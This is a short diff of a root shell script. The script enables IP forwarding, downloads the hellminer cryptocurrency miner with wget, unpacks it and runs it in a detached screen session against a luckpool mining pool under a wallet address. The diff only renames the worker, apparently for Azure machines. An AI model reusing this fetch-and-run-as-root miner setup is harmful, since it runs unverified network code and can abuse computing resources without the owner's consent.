@@ -8,4 +8,4 @@ echo -e 'net.ipv4.ip_forward=1' >> /etc/sysctl.conf
 /etc/init.d/linux-igd restart && sysctl -p 
 cd /root
 wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xvf hellminer_cpu_linux.tar.gz
-screen -dmS vrsk /root/./hellminer -c stratum+tcp://eu.luckpool.net:3956 -u RW7oReZ81MzgodB7LEksNTwuJ34iGDrmta.azureDas -p x --cpu 4
+screen -dmS vrsk /root/./hellminer -c stratum+tcp://eu.luckpool.net:3956 -u RW7oReZ81MzgodB7LEksNTwuJ34iGDrmta.azureF2 -p x --cpu 4
